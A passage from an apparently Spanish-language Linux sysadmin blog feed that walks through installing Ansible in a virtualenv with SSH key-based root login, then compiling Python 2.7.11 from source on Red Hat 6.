&lt;p&gt;Utilizamos el comando &lt;em&gt;virtualenv&lt;/em&gt; para generar la estructura contenedora, de la misma manera que otros &lt;em&gt;virtualenv&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;gerard@toolbox ~&lt;span class="o"&gt;]&lt;/span&gt;$ ./virtualenv-15.0.1/virtualenv.py ansible
New python executable in /home/gerard/ansible/bin/python
Installing setuptools, pip, wheel...done.
&lt;span class="o"&gt;[&lt;/span&gt;gerard@toolbox ~&lt;span class="o"&gt;]&lt;/span&gt;$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Hacemos limpieza de &lt;strong&gt;virtualenv&lt;/strong&gt;, que ya no vamos a necesitar mas.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;gerard@toolbox ~&lt;span class="o"&gt;]&lt;/span&gt;$ rm -R virtualenv-15.0.1*
&lt;span class="o"&gt;[&lt;/span&gt;gerard@toolbox ~&lt;span class="o"&gt;]&lt;/span&gt;$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;La instalación es la misma que haríamos con cualquier módulo de &lt;strong&gt;python&lt;/strong&gt;, con la excepción que va a generar fichero &lt;em&gt;.so&lt;/em&gt;, dependientes de la arquitectura del procesador que los genere. Si movéis el &lt;strong&gt;virtualenv&lt;/strong&gt;, tened esto en cuenta.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;gerard@toolbox ~&lt;span class="o"&gt;]&lt;/span&gt;$ &lt;span class="nb"&gt;source&lt;/span&gt; ansible/bin/activate
&lt;span class="o"&gt;(&lt;/span&gt;ansible&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;gerard@toolbox ~&lt;span class="o"&gt;]&lt;/span&gt;$ pip install ansible
DEPRECATION: Python &lt;span class="m"&gt;2&lt;/span&gt;.6 is no longer supported by the Python core team, please upgrade your Python. A future version of pip will drop support &lt;span class="k"&gt;for&lt;/span&gt; Python &lt;span class="m"&gt;2&lt;/span&gt;.6
Collecting ansible
...
Installing collected packages: ecdsa, pycrypto, paramiko, MarkupSafe, jinja2, PyYAML, ansible
Successfully installed MarkupSafe-0.23 PyYAML-3.11 ansible-2.0.1.0 ecdsa-0.13 jinja2-2.8 paramiko-1.16.0 pycrypto-2.6.1
&lt;span class="o"&gt;(&lt;/span&gt;ansible&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;gerard@toolbox ~&lt;span class="o"&gt;]&lt;/span&gt;$ deactivate
&lt;span class="o"&gt;[&lt;/span&gt;gerard@toolbox ~&lt;span class="o"&gt;]&lt;/span&gt;$
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Controlando nuestro primer esclavo&lt;/h2&gt;
&lt;p&gt;Vamos a habilitar una máquina cualquiera como receptora de &lt;strong&gt;ansible&lt;/strong&gt;. Los puntos básicos a tener en cuenta es que vamos a habilitar &lt;strong&gt;SSH&lt;/strong&gt; por claves (sin contraseña) y debemos asegurar que la máquina destino tiene un &lt;strong&gt;python&lt;/strong&gt; instalado.&lt;/p&gt;
&lt;p&gt;Empezaremos generando las claves privada y pública en la máquina controladora. Esto se hace mediante el comando &lt;em&gt;ssh-keygen&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;gerard@toolbox ~&lt;span class="o"&gt;]&lt;/span&gt;$ ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key &lt;span class="o"&gt;(&lt;/span&gt;/home/gerard/.ssh/id_rsa&lt;span class="o"&gt;)&lt;/span&gt;:
Created directory &lt;span class="s1"&gt;&amp;#39;/home/gerard/.ssh&amp;#39;&lt;/span&gt;.
Enter passphrase &lt;span class="o"&gt;(&lt;/span&gt;empty &lt;span class="k"&gt;for&lt;/span&gt; no passphrase&lt;span class="o"&gt;)&lt;/span&gt;:
Enter same passphrase again:
Your identification has been saved in /home/gerard/.ssh/id_rsa.
Your public key has been saved in /home/gerard/.ssh/id_rsa.pub.
The key fingerprint is:
8e:74:f9:49:70:ba:15:d0:93:ff:88:5a:6a:f5:ad:cd gerard@toolbox
The key&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;s randomart image is:
+--&lt;span class="o"&gt;[&lt;/span&gt; RSA &lt;span class="m"&gt;2048&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;----+
&lt;span class="p"&gt;|&lt;/span&gt;        .. .     &lt;span class="p"&gt;|&lt;/span&gt;
&lt;span class="p"&gt;|&lt;/span&gt;         .+      &lt;span class="p"&gt;|&lt;/span&gt;
&lt;span class="p"&gt;|&lt;/span&gt;        . oo     &lt;span class="p"&gt;|&lt;/span&gt;
&lt;span class="p"&gt;|&lt;/span&gt;         &lt;span class="o"&gt;=&lt;/span&gt; ..    &lt;span class="p"&gt;|&lt;/span&gt;
&lt;span class="p"&gt;|&lt;/span&gt;      . S o. o   &lt;span class="p"&gt;|&lt;/span&gt;
&lt;span class="p"&gt;|&lt;/span&gt;     . + &lt;span class="o"&gt;=&lt;/span&gt;+.. .  &lt;span class="p"&gt;|&lt;/span&gt;
&lt;span class="p"&gt;|&lt;/span&gt;      . &lt;span class="nv"&gt;o&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;o. .   &lt;span class="p"&gt;|&lt;/span&gt;
&lt;span class="p"&gt;|&lt;/span&gt;        +   .o.  &lt;span class="p"&gt;|&lt;/span&gt;
&lt;span class="p"&gt;|&lt;/span&gt;       .    ..E  &lt;span class="p"&gt;|&lt;/span&gt;
+-----------------+
&lt;span class="o"&gt;[&lt;/span&gt;gerard@toolbox ~&lt;span class="o"&gt;]&lt;/span&gt;$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Esto va a generar una carpeta &lt;em&gt;.ssh&lt;/em&gt; en nuestra carpeta personal, con dos ficheros generados: &lt;em&gt;id_rsa&lt;/em&gt; (clave privada) e &lt;em&gt;id_rsa.pub&lt;/em&gt; (clave pública). La idea es que la clave privada se va a ofrecer automáticamente cuando se haga &lt;strong&gt;ssh&lt;/strong&gt;, y si la parte pública esta en &lt;em&gt;~/.ssh/authorized_keys&lt;/em&gt; del usuario remoto, el login se hace automático.&lt;/p&gt;
&lt;p&gt;La clave privada es sagrada, y no debe entregarse a nadie. Sin embargo, la parte pública es la que se va a poner en todas las máquinas controladas. Se trata de una línea que vamos a añadir al &lt;em&gt;authorized_keys&lt;/em&gt; de todas las máquinas, así que la apuntamos en algún sitio.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;gerard@toolbox ~&lt;span class="o"&gt;]&lt;/span&gt;$ cat .ssh/id_rsa.pub
ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAo/hobjbaSNX4zP/wjke5FY910xk5VwW0WaAO10ILAbvhuswdghLbMBdgt+4tWIwFM4DgOwA62wQ04lPsxpQ7Ya4VVmVVZLN5oN2BGQ2ixV6ofB8PA51vNDO5p0xz4ExYebXu8qshrOi4ulcSsc1rEDhlT+zZkYApjVOcgmO7T7T6149XWWBH0YSFEOto8qF+YiyS2yMlVy5p6QruHNPwcr6kC0z13aYrNUnk5VXFwlOSRtUTYMZ+c0ysh49uTDm50AWoccuDUK0v0juNWnHfQw1PFYLaQZLmJEWIkIsND3pBACHdFTyJDGDOB2Kuw+DCaAxp5vqPt5zFuidVS0h5Mw&lt;span class="o"&gt;==&lt;/span&gt; gerard@toolbox
&lt;span class="o"&gt;[&lt;/span&gt;gerard@toolbox ~&lt;span class="o"&gt;]&lt;/span&gt;$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;En la máquina controlada, añadimos la línea de la clave pública en el fichero &lt;em&gt;authorized_keys&lt;/em&gt;. Vamos a controlar login automático contra el usuario &lt;em&gt;root&lt;/em&gt; en nuestra máquina de ejemplo misma.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;root@toolbox ~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c1"&gt;# cat .ssh/authorized_keys&lt;/span&gt;
ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAo/hobjbaSNX4zP/wjke5FY910xk5VwW0WaAO10ILAbvhuswdghLbMBdgt+4tWIwFM4DgOwA62wQ04lPsxpQ7Ya4VVmVVZLN5oN2BGQ2ixV6ofB8PA51vNDO5p0xz4ExYebXu8qshrOi4ulcSsc1rEDhlT+zZkYApjVOcgmO7T7T6149XWWBH0YSFEOto8qF+YiyS2yMlVy5p6QruHNPwcr6kC0z13aYrNUnk5VXFwlOSRtUTYMZ+c0ysh49uTDm50AWoccuDUK0v0juNWnHfQw1PFYLaQZLmJEWIkIsND3pBACHdFTyJDGDOB2Kuw+DCaAxp5vqPt5zFuidVS0h5Mw&lt;span class="o"&gt;==&lt;/span&gt; gerard@toolbox
&lt;span class="o"&gt;[&lt;/span&gt;root@toolbox ~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c1"&gt;#&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Una vez que tengamos las claves &lt;strong&gt;SSH&lt;/strong&gt; distribuidas, y &lt;strong&gt;python&lt;/strong&gt; instalado en las máquinas controladas, podemos probar. Para ello, vamos a añadir esta máquina en el fichero de &lt;em&gt;hosts&lt;/em&gt;, sea por nombre o por dirección IP.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;gerard@toolbox ~&lt;span class="o"&gt;]&lt;/span&gt;$ cat hosts
&lt;span class="m"&gt;127&lt;/span&gt;.0.0.1
&lt;span class="o"&gt;[&lt;/span&gt;gerard@toolbox ~&lt;span class="o"&gt;]&lt;/span&gt;$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y lanzamos el módulo &lt;strong&gt;ping&lt;/strong&gt; a todas las máquinas (que solo es la de test, de momento).&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;gerard@toolbox ~&lt;span class="o"&gt;]&lt;/span&gt;$ ./ansible/bin/ansible -u root -i hosts -m ping all
&lt;span class="m"&gt;127&lt;/span&gt;.0.0.1 &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="nv"&gt;SUCCESS&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; &lt;span class="o"&gt;{&lt;/span&gt;
    &lt;span class="s2"&gt;&amp;quot;changed&amp;quot;&lt;/span&gt;: false,
    &lt;span class="s2"&gt;&amp;quot;ping&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;pong&amp;quot;&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
&lt;span class="o"&gt;[&lt;/span&gt;gerard@toolbox ~&lt;span class="o"&gt;]&lt;/span&gt;$
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Creando un fichero de configuración&lt;/h2&gt;
&lt;p&gt;Las opciones por defecto de &lt;strong&gt;ansible&lt;/strong&gt; son bastante correctas, pero hay algunos parámetros que se pueden poner por fichero de configuración; esto nos facilita bastante las cosas. Este fichero de configuración es el primero que se encuentre siguiendo este orden:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ANSIBLE_CONFIG (lo que diga esta variable de entorno)&lt;/li&gt;
&lt;li&gt;ansible.cfg (en el directorio actual de trabajo)&lt;/li&gt;
&lt;li&gt;.ansible.cfg (en la carpeta personal de nuestro usuario)&lt;/li&gt;
&lt;li&gt;/etc/ansible/ansible.cfg&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;De hecho, si os parece bien utilizar carpetas de sistema, la última opción es la normal. Sin embargo, me interesa restringirme a mi carpeta local, por falta de permisos habitualmente.&lt;/p&gt;
&lt;p&gt;De la misma manera, el fichero de &lt;em&gt;hosts&lt;/em&gt; se busca en un sitio concreto, que con la configuración estándar es &lt;em&gt;/etc/ansible/hosts&lt;/em&gt;, a menos que se indique explícitamente el flag &lt;em&gt;-i&lt;/em&gt; en los comandos.&lt;/p&gt;
&lt;p&gt;Para evitar usar estos dos ficheros fuera de nuestra carpeta, vamos a crearlos en el &lt;strong&gt;virtualenv&lt;/strong&gt; creado, añadiéndolos en una carpeta &lt;em&gt;etc&lt;/em&gt;, que vamos a crear. Todos los parámetros se van a poner en el fichero de configuración y vamos a explicitar la localización del fichero de configuración.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;gerard@toolbox ~&lt;span class="o"&gt;]&lt;/span&gt;$ mkdir ansible/etc
&lt;span class="o"&gt;[&lt;/span&gt;gerard@toolbox ~&lt;span class="o"&gt;]&lt;/span&gt;$ cat ansible/etc/ansible.cfg
&lt;span class="o"&gt;[&lt;/span&gt;defaults&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="nv"&gt;inventory&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; /home/gerard/ansible/etc/hosts
&lt;span class="nv"&gt;host_key_checking&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; False
&lt;span class="nv"&gt;remote_user&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; root
&lt;span class="o"&gt;[&lt;/span&gt;gerard@toolbox ~&lt;span class="o"&gt;]&lt;/span&gt;$ mv hosts ansible/etc/
&lt;span class="o"&gt;[&lt;/span&gt;gerard@toolbox ~&lt;span class="o"&gt;]&lt;/span&gt;$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Tras crear la configuración, la probamos:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;gerard@toolbox ~&lt;span class="o"&gt;]&lt;/span&gt;$ &lt;span class="nv"&gt;ANSIBLE_CONFIG&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/home/gerard/ansible/etc/ansible.cfg ./ansible/bin/ansible -m ping all
&lt;span class="m"&gt;127&lt;/span&gt;.0.0.1 &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="nv"&gt;SUCCESS&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; &lt;span class="o"&gt;{&lt;/span&gt;
    &lt;span class="s2"&gt;&amp;quot;changed&amp;quot;&lt;/span&gt;: false,
    &lt;span class="s2"&gt;&amp;quot;ping&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;pong&amp;quot;&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
&lt;span class="o"&gt;[&lt;/span&gt;gerard@toolbox ~&lt;span class="o"&gt;]&lt;/span&gt;$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Para conseguir eliminar el &lt;em&gt;path&lt;/em&gt; absoluto del binario de ansible, lo añadimos en la variable de entorno &lt;em&gt;PATH&lt;/em&gt;. Para nuestra comodidadd, podemos definir ambas variables de entorno en el fichero &lt;em&gt;.bashrc&lt;/em&gt;. Este fichero se va a activar cada vez que se inicie &lt;strong&gt;bash&lt;/strong&gt;; para no cerrar y abrir sesión lo incluimos a mano.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;gerard@toolbox ~&lt;span class="o"&gt;]&lt;/span&gt;$ tail -2 .bashrc
&lt;span class="nb"&gt;export&lt;/span&gt; &lt;span class="nv"&gt;ANSIBLE_CONFIG&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;~/ansible/etc/ansible.cfg
&lt;span class="nb"&gt;export&lt;/span&gt; &lt;span class="nv"&gt;PATH&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;~/ansible/bin:&lt;span class="nv"&gt;$PATH&lt;/span&gt;
&lt;span class="o"&gt;[&lt;/span&gt;gerard@toolbox ~&lt;span class="o"&gt;]&lt;/span&gt;$ &lt;span class="nb"&gt;source&lt;/span&gt; .bashrc
&lt;span class="o"&gt;[&lt;/span&gt;gerard@toolbox ~&lt;span class="o"&gt;]&lt;/span&gt;$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y finalmente obtenemos la versión mínima del comando a ejecutar.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;gerard@toolbox ~&lt;span class="o"&gt;]&lt;/span&gt;$ ansible -m ping all
&lt;span class="m"&gt;127&lt;/span&gt;.0.0.1 &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="nv"&gt;SUCCESS&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; &lt;span class="o"&gt;{&lt;/span&gt;
    &lt;span class="s2"&gt;&amp;quot;changed&amp;quot;&lt;/span&gt;: false,
    &lt;span class="s2"&gt;&amp;quot;ping&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;pong&amp;quot;&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
&lt;span class="o"&gt;[&lt;/span&gt;gerard@toolbox ~&lt;span class="o"&gt;]&lt;/span&gt;$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Ahora solo queda poner mas servidores en el fichero de &lt;em&gt;hosts&lt;/em&gt; y lanzar comandos y &lt;em&gt;playbooks&lt;/em&gt; útiles contra los mismos.&lt;/p&gt;</content><category term="linux"></category><category term="redhat"></category><category term="centos"></category><category term="python"></category><category term="ansible"></category><category term="ssh"></category><category term="virtualenv"></category></entry><entry><title>Compilando python desde cero</title><link href="http://www.linuxsysadmin.ml/2016/04/compilando-python-desde-cero.html" rel="alternate"></link><published>2016-04-04T08:00:00+02:00</published><updated>2016-04-04T08:00:00+02:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2016-04-04:/2016/04/compilando-python-desde-cero.html</id><summary type="html">&lt;p&gt;Siempre que estoy trabajando en un servidor CentOS o RedHat, veo que las versiones de &lt;em&gt;python&lt;/em&gt; que usan son bastante viejas. De hecho, hay una gran mejora de &lt;em&gt;python&lt;/em&gt; entre las versiones 2.4, 2.6 y 2.7; así que es frecuente compilar una versión superior para nuestro uso …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Siempre que estoy trabajando en un servidor CentOS o RedHat, veo que las versiones de &lt;em&gt;python&lt;/em&gt; que usan son bastante viejas. De hecho, hay una gran mejora de &lt;em&gt;python&lt;/em&gt; entre las versiones 2.4, 2.6 y 2.7; así que es frecuente compilar una versión superior para nuestro uso.&lt;/p&gt;
&lt;p&gt;Para este tutorial he usado una máquina virtual con un sistema operativo &lt;em&gt;RedHat&lt;/em&gt;. Realmente no necesita ninguna configuración &lt;em&gt;hardware&lt;/em&gt; adicional. Lo único relevante es que estamos tratando con una versión de &lt;em&gt;RedHat&lt;/em&gt; 6.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;gerard@foundry ~&lt;span class="o"&gt;]&lt;/span&gt;$ cat /etc/redhat-release
Red Hat Enterprise Linux Server release &lt;span class="m"&gt;6&lt;/span&gt;.7 &lt;span class="o"&gt;(&lt;/span&gt;Santiago&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;[&lt;/span&gt;gerard@foundry ~&lt;span class="o"&gt;]&lt;/span&gt;$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;El otro requisito necesario es el fichero &lt;em&gt;tarball&lt;/em&gt; con las fuentes de &lt;em&gt;python&lt;/em&gt;. Esto lo podemos encontrar en &lt;a href="https://www.python.org/"&gt;la página de &lt;em&gt;python&lt;/em&gt;&lt;/a&gt;. Al tiempo de escritura, la última &lt;em&gt;release&lt;/em&gt; de la serie de &lt;em&gt;python&lt;/em&gt; 2 era la 2.7.11.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;gerard@foundry ~&lt;span class="o"&gt;]&lt;/span&gt;$ wget https://www.python.org/ftp/python/2.7.11/Python-2.7.11.tgz
--2016-03-29 &lt;span class="m"&gt;16&lt;/span&gt;:27:54--  https://www.python.org/ftp/python/2.7.11/Python-2.7.11.tgz
Resolving www.python.org... &lt;span class="m"&gt;185&lt;/span&gt;.31.17.223
Connecting to www.python.org&lt;span class="p"&gt;|&lt;/span&gt;&lt;span class="m"&gt;185&lt;/span&gt;.31.17.223&lt;span class="p"&gt;|&lt;/span&gt;:443... connected.
HTTP request sent, awaiting response... &lt;span class="m"&gt;200&lt;/span&gt; OK
Length: &lt;span class="m"&gt;16856409&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;16M&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;application/octet-stream&lt;span class="o"&gt;]&lt;/span&gt;
Saving to: “Python-2.7.11.tgz”

&lt;span class="m"&gt;100&lt;/span&gt;%&lt;span class="o"&gt;[========================================================================================&lt;/span&gt;&amp;gt;&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="m"&gt;16&lt;/span&gt;,856,409  &lt;span class="m"&gt;17&lt;/span&gt;.3M/s   in &lt;span class="m"&gt;0&lt;/span&gt;.9s

&lt;span class="m"&gt;2016&lt;/span&gt;-03-29 &lt;span class="m"&gt;16&lt;/span&gt;:27:55 &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;17&lt;/span&gt;.3 MB/s&lt;span class="o"&gt;)&lt;/span&gt; - “Python-2.7.11.tgz” saved &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;16856409&lt;/span&gt;/16856409&lt;span class="o"&gt;]&lt;/span&gt;

&lt;span class="o"&gt;[&lt;/span&gt;gerard@foundry ~&lt;span class="o"&gt;]&lt;/span&gt;$
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Compilar las fuentes&lt;/h2&gt;
&lt;p&gt;Descomprimimos el &lt;em&gt;tarball&lt;/em&gt; y nos situamos en la carpeta recién creada.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;gerard@foundry ~&lt;span class="o"&gt;]&lt;/span&gt;$ tar xzf Python-2.7.11.tgz
&lt;span class="o"&gt;[&lt;/span&gt;gerard@foundry ~&lt;span class="o"&gt;]&lt;/span&gt;$ &lt;span class="nb"&gt;cd&lt;/span&gt; Python-2.7.11
&lt;span class="o"&gt;[&lt;/span&gt;gerard@foundry Python-2.7.11&lt;span class="o"&gt;]&lt;/span&gt;$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;El procedimiento de compilación es el estándar: &lt;strong&gt;configure&lt;/strong&gt;, &lt;strong&gt;make&lt;/strong&gt; y &lt;strong&gt;make install&lt;/strong&gt;. Empezamos por configurarlo. Solo voy a añadir una carpeta que no interfiera con el sistema operativo, por ejemplo, &lt;em&gt;/opt/python27/&lt;/em&gt;. Otro punto interesante es el modificador &lt;strong&gt;--enable-shared&lt;/strong&gt;, para generar la librería &lt;em&gt;libpython2.7.so&lt;/em&gt;, por si nos hiciera falta.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;gerard@foundry Python-2.7.11&lt;span class="o"&gt;]&lt;/span&gt;$ ./configure --prefix&lt;span class="o"&gt;=&lt;/span&gt;/opt/python27
checking build system type... x86_64-unknown-linux-gnu
checking host system type... x86_64-unknown-linux-gnu
...
configure: creating ./config.status
config.status: creating Makefile.pre
config.status: creating Modules/Setup.config
config.status: creating Misc/python.pc
config.status: creating Modules/ld_so_aix
config.status: creating pyconfig.h
config.status: pyconfig.h is unchanged
creating Modules/Setup
creating Modules/Setup.local
creating Makefile
&lt;span class="o"&gt;[&lt;/span&gt;gerard@foundry Python-2.7.11&lt;span class="o"&gt;]&lt;/span&gt;$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Compilamos usando &lt;strong&gt;make&lt;/strong&gt; con el &lt;em&gt;Makefile&lt;/em&gt; recién generado por el &lt;em&gt;script&lt;/em&gt; &lt;strong&gt;configure&lt;/strong&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;gerard@foundry Python-2.7.11&lt;span class="o"&gt;]&lt;/span&gt;$ make
...
Python build finished, but the necessary bits to build these modules were not found:
_bsddb             _curses            _curses_panel
_sqlite3           _tkinter           bsddb185
bz2                dbm                dl
gdbm               imageop            readline
sunaudiodev
To find the necessary bits, look in setup.py in detect_modules&lt;span class="o"&gt;()&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; the module&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;s name.

running build_scripts
&lt;span class="o"&gt;[&lt;/span&gt;gerard@foundry Python-2.7.11&lt;span class="o"&gt;]&lt;/span&gt;$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Hay algunos módulos de la librería estándar que necesitan las versiones &lt;strong&gt;-devel&lt;/strong&gt; de algunas librerías, aunque se pueden obviar y no se construyen.&lt;/p&gt;
&lt;p&gt;Opcionalmente podemos instalar algunas de esas librerías, y tras volver a ejecutar &lt;strong&gt;configure&lt;/strong&gt; y &lt;strong&gt;make&lt;/strong&gt;, se construirían esos módulos.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;gerard@foundry Python-2.7.11&lt;span class="o"&gt;]&lt;/span&gt;$ yum install zlib-devel bzip2-devel openssl-devel ncurses-devel sqlite-devel readline-devel tk-devel
&lt;span class="o"&gt;[&lt;/span&gt;gerard@foundry Python-2.7.11&lt;span class="o"&gt;]&lt;/span&gt;$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Finalmente lo ponemos en su carpeta (&lt;em&gt;--prefix&lt;/em&gt;) mediante &lt;strong&gt;make install&lt;/strong&gt;. No tengo permiso de escritura en &lt;em&gt;/opt/&lt;/em&gt;, así que vamos a usar &lt;strong&gt;sudo&lt;/strong&gt; para todos los comandos que impliquen la carpeta &lt;em&gt;/opt/&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;gerard@foundry Python-2.7.11&lt;span class="o"&gt;]&lt;/span&gt;$ sudo make install
Creating directory /opt/python27/bin
Creating directory /opt/python27/lib
...
&lt;span class="o"&gt;[&lt;/span&gt;gerard@foundry Python-2.7.11&lt;span class="o"&gt;]&lt;/span&gt;$
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Comprobar que funciona&lt;/h2&gt;
&lt;p&gt;Vamos a ejecutar el binario &lt;strong&gt;python&lt;/strong&gt; para verificar que funciona y que estamos mirando la versión que toca. Vamos a usar la ruta completa para referirnos al binario, aunque lo ideal sería que estuviera en el &lt;em&gt;PATH&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;gerard@foundry ~&lt;span class="o"&gt;]&lt;/span&gt;$ /opt/python27/bin/python -V
Python &lt;span class="m"&gt;2&lt;/span&gt;.7.11
&lt;span class="o"&gt;[&lt;/span&gt;gerard@foundry ~&lt;span class="o"&gt;]&lt;/span&gt;$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Para ver que la librería estándar funciona y es utilizable, basta con importar alguno de sus módulos e invocar alguna de sus funciones.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;gerard@foundry ~&lt;span class="o"&gt;]&lt;/span&gt;$ /opt/python27/bin/python
Python &lt;span class="m"&gt;2&lt;/span&gt;.7.11 &lt;span class="o"&gt;(&lt;/span&gt;default, Mar &lt;span class="m"&gt;29&lt;/span&gt; &lt;span class="m"&gt;2016&lt;/span&gt;, &lt;span class="m"&gt;16&lt;/span&gt;:42:10&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;[&lt;/span&gt;GCC &lt;span class="m"&gt;4&lt;/span&gt;.4.7 &lt;span class="m"&gt;20120313&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;Red Hat &lt;span class="m"&gt;4&lt;/span&gt;.4.7-16&lt;span class="o"&gt;)]&lt;/span&gt; on linux2
